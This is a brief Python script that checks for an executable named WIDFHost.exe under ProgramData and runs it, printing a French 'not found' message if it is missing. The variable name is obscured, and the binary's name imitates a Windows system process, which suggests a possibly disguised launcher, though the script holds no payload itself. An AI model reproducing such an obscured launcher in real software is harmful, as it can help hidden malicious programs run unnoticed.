import os
import subprocess

DSHJDF5646SDFS65DF1265SDFG = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WIDFHost.exe')

if os.path.isfile(DSHJDF5646SDFS65DF1265SDFG):
    subprocess.run([DSHJDF5646SDFS65DF1265SDFG])
else:
    print("L'application WIDFHost.exe est introuvable dans ProgramData.")
